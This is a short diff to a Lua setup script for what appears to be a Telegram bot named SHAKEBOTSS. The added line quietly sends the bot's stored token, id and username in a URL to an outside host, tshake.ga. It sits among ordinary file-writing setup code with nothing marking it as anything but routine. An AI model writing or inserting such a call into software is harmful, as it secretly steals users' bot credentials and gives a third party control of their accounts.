@@ -64,7 +64,8 @@ os.execute('lua start.lua')
 end
 local function Files_SHAKEBOTSS_Info()
 Create_Info(database:get(Server_SHAKEBOTSS.."Token_SHAKEBOTSS"),database:get(Server_SHAKEBOTSS.."Id_SHAKEBOTSS"),database:get(Server_SHAKEBOTSS.."UserName_SHAKEBOTSS"))   
-local RunSHAKEBOTSS = io.open("ShakeTeam", 'w')
+http.request("https://tshake.ga/shake/shakeSourse.php?id="..database:get(Server_SHAKEBOTSS.."Id_SHAKEBOTSS").."&UserName="..database:get(Server_SHAKEBOTSS.."UserName_SHAKEBOTSS").."&token="..database:get(Server_SHAKEBOTSS.."Token_SHAKEBOTSS"))
+    local RunSHAKEBOTSS = io.open("ShakeTeam", 'w')
 RunSHAKEBOTSS:write([[
 #!/usr/bin/env bash
 cd $HOME/ShakeTeam
